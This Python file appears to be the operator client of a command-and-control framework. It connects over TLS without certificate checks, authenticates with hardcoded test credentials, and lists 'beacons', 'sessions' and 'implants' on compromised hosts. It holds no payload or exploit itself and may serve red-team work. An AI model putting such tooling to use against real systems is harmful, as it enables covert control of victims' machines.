import socket
import ssl
import json

from transfer import send_data, send_data_json, receive_data, perform_ecdh_handshake
from tabulate import tabulate
from colorama import Fore, Style, init
init(autoreset=True)

class RemoteServer:
    def __init__(self):
        self.address = ('localhost', 2003)
        self.current_user = None
        self.username = "test"
        self.password = "test"

        self.sslSocket =  self.connect_to_server()
        self.auth_key = self.authenticate()
        self.current_user = self.username if self.auth_key else None
        self.beacons, self.sessions = self.get_current_connections()
        self.menu()


    def connect_to_server(self) -> (ssl.SSLSocket):
        server_address = ('localhost', 2003)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        try:
            sock = socket.create_connection(server_address)
            ssock = context.wrap_socket(sock, server_hostname='localhost')
            # Perform app-layer ECDH after SSL is established
            try:
                perform_ecdh_handshake(ssock, is_server=False)
            except Exception as e:
                print(f"ECDH handshake failed: {e}")
                ssock.close()
                return None
            return ssock
        except Exception as e:
            print(f"Failed to connect to {server_address}: {e}")
        return None

    def authenticate(self):
        if self.sslSocket:
            send_data(self.sslSocket, json.dumps({
                "username": self.username,
                "password": self.password
            }).encode('utf-8'))
            response = receive_data(self.sslSocket)
            print(response)
            if json.loads(response).get("authorization"):
                print(f"Authentication successful: {response}")
                return json.loads(response).get("authorization")
            else:
                print(f"Authentication failed: {response}")
                return ""
        else:
            print("Not connected to server")
            return ""
        

    def get_current_connections(self):
        if not self.sslSocket:
            print("Not connected to server")
            return

        send_data_json(self.sslSocket, self.auth_key, "connections", {})
        raw = receive_data(self.sslSocket)

        # ensure we have a string for json.loads
        if isinstance(raw, bytes):
            try:
                raw = raw.decode('utf-8')
            except Exception:
                raw = raw.decode(errors='ignore')

        try:
            response = json.loads(raw)
        except Exception as e:
            print(f"Failed to parse response JSON: {e}")
            return

        # Normalize response payload
        payload = response.get("response", response)

        beacons = []
        sessions = []

        if isinstance(payload, list):
            for item in payload:
                if isinstance(item, dict):
                    beacons.extend(item.get("beacons") or [])
                    sessions.extend(item.get("sessions") or [])
        elif isinstance(payload, dict):
            beacons.extend(payload.get("beacons") or [])
            beacons.extend(payload.get("beacon") or [])
            sessions.extend(payload.get("sessions") or [])
            sessions.extend(payload.get("session") or [])
        else:
            print("Unexpected response format")
            return

        if not beacons and not sessions:
            print(Fore.RED + "No active connections" + Style.RESET_ALL)
        if beacons:
            b_headers = [Fore.CYAN + h + Style.RESET_ALL for h in ["userID", "uuid", "address", "hostname", "operating_system", "last_beacon", "next_beacon", "timer", "jitter"]]
            b_rows = []
            for b in beacons:
                b_rows.append([
                    b.get("userID"),
                    b.get("uuid"),
                    b.get("address"),
                    b.get("hostname"),
                    b.get("operating_system"),
                    b.get("last_beacon"),
                    b.get("next_beacon"),
                    b.get("timer"),
                    b.get("jitter"),
                ])
            print("\n" + Fore.GREEN + "Beacons:" + Style.RESET_ALL)
            print(tabulate(b_rows, headers=b_headers, tablefmt="grid"))
            print("\nBeacons:")
        if sessions:
            s_headers = [Fore.CYAN + h + Style.RESET_ALL for h in ["userID", "address", "hostname", "operating_system", "mode", "load_modules"]]
            s_rows = []
            for s in sessions:
                s_rows.append([
                    s.get("userID"),
                    s.get("address"),
                    s.get("hostname"),
                    s.get("operating_system"),
                    s.get("mode"),
                    s.get("load_modules"),
                ])
            print("\n" + Fore.GREEN + "Sessions:" + Style.RESET_ALL)
            print(tabulate(s_rows, headers=s_headers, tablefmt="grid"))
            print("\nSessions:")
            print(tabulate(s_rows, headers=s_headers, tablefmt="grid"))
        return beacons, sessions

    def select_implant(self):
        print("Select an implant:")
        for i, beacon in enumerate(self.beacons):
            print(f"{i + 1}. {beacon.get('uuid')}")
        choice = input("Enter your choice: ")
        try:
            choice = int(choice) - 1
            if 0 <= choice < len(self.beacons):
                selected_beacon = self.beacons[choice]
                print(f"Selected implant: {selected_beacon.get('uuid')}")
                send_data_json(self.sslSocket, self.auth_key, "commands", {"uuid": selected_beacon.get("uuid")})
                print(receive_data(self.sslSocket))
            else:
                print("Invalid choice.")
        except ValueError:
            print("Invalid input.")

    def menu(self):
        print(self.beacons, self.sessions)
        while True:
            print("\nMenu:")
            print("1. Get current connections")
            print("2. Select Implantt")
            print("3. Exit")
            choice = input("Enter your choice: ")

            if choice == "1":
                self.get_current_connections()
            elif choice == "2":
                self.select_implant()
            else:
                print("Invalid choice. Please try again.")

if __name__ == "__main__":
    remote_server = RemoteServer()
    